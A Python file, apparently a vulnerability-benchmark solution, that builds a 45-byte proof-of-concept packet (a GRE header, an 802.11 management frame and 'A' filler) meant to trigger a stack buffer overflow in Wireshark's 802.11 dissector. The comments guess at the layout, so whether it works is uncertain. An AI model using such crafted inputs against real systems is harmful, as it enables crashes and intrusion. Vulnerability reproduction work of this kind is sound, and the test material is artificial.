import os
import subprocess
import tempfile
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is a stack buffer overflow in the 802.11 dissector
        # when called from GRE dissector. The ground-truth length is 45 bytes.
        # Based on typical buffer overflow exploitation patterns, we'll construct
        # a minimal packet that triggers the overflow.
        
        # Structure based on analysis:
        # 1. GRE header (4 bytes minimum)
        # 2. 802.11 frame that overflows a buffer
        
        # Create a minimal GRE packet with protocol type for 802.11
        # Protocol type 0x0075 is 802.11 in Wireshark's gre.proto table
        gre_header = struct.pack('>HH', 0x2000, 0x0075)  # Flags=0x2000 (RFC 2784), Protocol=0x0075
        
        # The 802.11 dissector expects radio tap pseudoheader but GRE provides
        # different pseudoheader. We'll craft a malformed 802.11 frame that
        # causes buffer overflow when dissector reads beyond bounds.
        
        # Minimal 802.11 frame structure that triggers overflow:
        # - Frame Control (2 bytes): Management frame (0x0000)
        # - Duration (2 bytes): 0x0000
        # - Destination (6 bytes): Broadcast
        # - Source (6 bytes): Random
        # - BSSID (6 bytes): Random
        # - Sequence Control (2 bytes): 0x0000
        # - Frame Body: Overflow data
        
        # Create the base 802.11 frame
        frame_control = struct.pack('<H', 0x0000)  # Management frame
        duration = struct.pack('<H', 0x0000)
        dest_addr = b'\xff\xff\xff\xff\xff\xff'  # Broadcast
        src_addr = b'\x00\x01\x02\x03\x04\x05'  # Arbitrary MAC
        bssid = b'\x06\x07\x08\x09\x0a\x0b'  # Arbitrary BSSID
        seq_ctrl = struct.pack('<H', 0x0000)
        
        # Assemble the base frame (24 bytes so far)
        base_frame = frame_control + duration + dest_addr + src_addr + bssid + seq_ctrl
        
        # Calculate overflow payload needed to reach total 45 bytes
        # GRE header: 4 bytes
        # Base frame: 24 bytes
        # Overflow needed: 45 - 4 - 24 = 17 bytes
        
        # Create overflow payload - repeated pattern that's likely to trigger
        # the overflow when dissector tries to parse radio tap header
        overflow_payload = b'A' * 17  # Simple pattern to trigger overflow
        
        # Assemble full packet
        poc = gre_header + base_frame + overflow_payload
        
        # Verify length matches ground-truth
        if len(poc) != 45:
            # Adjust if needed
            poc = poc[:45] if len(poc) > 45 else poc.ljust(45, b'\x00')
        
        return poc